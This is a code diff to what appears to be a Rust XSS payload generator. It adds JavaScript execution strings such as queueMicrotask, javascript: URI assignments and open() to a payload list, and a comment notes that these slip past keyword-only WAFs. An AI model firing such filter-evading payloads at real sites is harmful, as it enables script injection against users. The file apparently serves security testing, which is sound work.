@@ -75,15 +75,24 @@ const TAG_EVENT_COMBOS: &[(&str, &str, &str)] = &[
 // ──────────────────────────────────────────────
 
 /// Alternative ways to execute JavaScript.
+///
+/// Audit (2026-05-10): added modern execution paths the original list
+/// missed — `print()` (browser print dialog, observable side-effect),
+/// `queueMicrotask` (defers to next microtask, often slips past
+/// keyword-only WAFs), `location=` assignment (forces navigation to a
+/// javascript: URI, observable in URL bar / referer), and `open()`
+/// (popup / new tab, also keyword-bypass-friendly).
 const EXEC_FUNCTIONS: &[&str] = &[
     "alert(1)",
     "alert`1`", // Tagged template literal
     "confirm(1)",
     "confirm`1`",
     "prompt(1)",
+    "print()",
     "eval('alert(1)')",
     "setTimeout('alert(1)')",
     "setInterval('alert(1)',0)",
+    "queueMicrotask(()=>alert(1))",
     "Function('alert(1)')()",
     "constructor.constructor('alert(1)')()",
     "[].constructor.constructor('alert(1)')()",
@@ -91,6 +100,10 @@ const EXEC_FUNCTIONS: &[&str] = &[
     "self['alert'](1)",
     "top['alert'](1)",
     "this['alert'](1)",
+    "location='javascript:alert(1)'",
+    "location.href='javascript:alert(1)'",
+    "open('javascript:alert(1)')",
+    "globalThis['alert'](1)",
 ];
 
 // ──────────────────────────────────────────────
